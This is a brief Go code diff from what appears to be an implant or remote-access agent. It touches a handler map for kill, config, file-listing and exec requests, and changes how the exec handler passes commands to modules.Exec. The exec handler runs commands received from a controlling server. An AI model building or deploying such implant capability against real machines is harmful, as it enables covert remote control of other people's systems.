@@ -10,7 +10,6 @@ import (
 var MessageTypeToFunc = map[int]func(net.Conn, interface{}){
 	communication.IMPLANT_KILL_REQ:   handleImplantKillReq,
 	communication.IMPLANT_CONFIG_REQ: handleImplantConfigReq,
-	//reserved for implant functionality
 	communication.FILE_INFO_REQ:      handleFileInfoReq,
 	communication.LS_REQ:             handleLsReq,
 	communication.EXEC_REQ:           handleExecReq,
@@ -86,7 +85,7 @@ func handleExecReq(conn net.Conn, arguments interface{}) {
 	if !ok {
 		return
 	}
-	result, err := modules.Exec(execReq.Cmd, execReq.Args)
+	result, err := modules.Exec(execReq.Cmd)
 	if err != nil {
 		SendErrorToServer(conn, execReq.TaskId, err)
 	} else {
